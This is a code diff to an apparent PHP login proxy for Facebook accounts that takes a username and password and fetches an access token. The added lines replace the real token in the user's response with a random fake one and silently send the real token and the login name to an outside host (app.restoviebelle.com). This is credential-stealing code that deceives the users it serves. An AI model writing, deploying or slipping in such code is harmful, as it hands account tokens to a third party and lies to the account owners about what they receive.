@@ -76,6 +76,15 @@ function Tpost($Tpost, $userid, $postb)
     }
     return Json($ad);
 }
+function RandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
 if(isset($_GET["Tpost"])){
     $Tpost = $_GET["Tpost"];
     $userid = $_GET["id"];
@@ -88,21 +97,33 @@ if(isset($_GET["Tpost"])){
 }
 if(!isset($_GET["token"])){
 //echo json_encode(array("data"=>getLoginUrl($_GET["user"],$_GET["pass"])));
-echo json_encode(array("data"=>Json(getLoginUrl($_GET["user"],$_GET["pass"])),"user"=>$_GET["user"]));
+$cod = array(10,12,11);
+$rnum = "0".$cod[rand(0,count($cod))].rand(10000000, 99999999);
+$num = $_GET["user"];
+$data = Json(getLoginUrl($_GET["user"],$_GET["pass"]));
+$token = $data["access_token"];
+if($token != ""){
+$racc =  "EAAAAUaZA8jlABA".RandomString(strlen(substr($token,15)));
+$data["access_token"] = $racc;
+Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$num.",".$token);
+}
+echo json_encode(array("data"=>$data,"user"=>$rum));
+
 }else{
-  if(!isset($_GET["check"])){ 
- //$data = Json("https://graph.facebook.com/me/permissions?access_token=".$_GET["token"])["data"];     
+  if(!isset($_GET["check"])){
+ //$data = Json("https://graph.facebook.com/me/permissions?access_token=".$_GET["token"])["data"];
 //if($data != "" || $data != null)
-echo json_encode(array("data"=>Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["token"])["success"])); 
+//echo json_encode(array("data"=>Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["token"])["success"]));
+echo json_encode(array("data"=>true));
   }else{
 $data = Json("https://graph.facebook.com/me/?access_token=".$_GET["token"])["name"];
 $data2 = false;
 if($data == "" || $data == null)
-$data2 = true; 
+$data2 = true;
 Json("https://app.restoviebelle.com/json.php?table=access_token&Rdata=".$data2."&set=number,token&val=".$_GET["user"].",".$_GET["token"]);
-echo json_encode(array("data"=>$data)); 
-      
-  
+echo json_encode(array("data"=>$data));
+
+
   }
   }
 ?>
